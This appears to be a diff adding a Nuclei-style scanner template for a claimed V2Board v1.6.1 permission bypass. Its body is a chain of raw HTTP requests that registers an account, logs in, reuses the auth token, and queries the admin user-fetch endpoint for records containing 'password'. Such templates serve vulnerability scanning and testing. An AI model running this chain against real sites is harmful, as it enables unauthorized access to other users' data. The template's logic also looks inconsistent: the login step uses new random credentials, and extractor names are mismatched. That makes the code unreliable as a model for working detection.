@@ -1,0 +1,73 @@
+id: v2board-permission-bypass
+info:
+  name: V2Board admin.php Permission Bypass Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    V2Board v1.6.1 has an unauthorized access vulnerability where any user can call the interface with administrator privileges to obtain background privileges.
+  tags: permission-bypass
+http:
+  - raw:
+      - |
+        POST /api/v1/passport/auth/register HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        email={{rand_text_alphanumeric(4)}}@163.com&password={{rand_text_alphanumeric(8)}}&invite_code=&email_code=
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "auth_data"
+    extractors:
+      - type: regex
+        name: auth_data
+        part: body
+        internal: true
+        regex:
+          - '"auth_data":"(.*?)"'
+  - raw:
+      - |
+        POST /api/v1/passport/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        email={{rand_text_alphanumeric(4)}}@163.com&password={{rand_text_alphanumeric(8)}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "token"
+          - "auth_data"
+    extractors:
+      - type: regex
+        name: token
+        part: body
+        internal: true
+        regex:
+          - '"auth_data":"(.*?)"'
+  - raw:
+      - |
+        GET /api/v1/user/info HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: {{token}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "email"
+  - raw:
+      - |
+        GET /api/v1/admin/user/fetch?pageSize=10&current=1 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: {{token}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "id"
+          - "password"
+    matchers-condition: and
+    stop-at-first-match: true
+flow: |
+  http(0) && http(1) && http(2) && http(3)
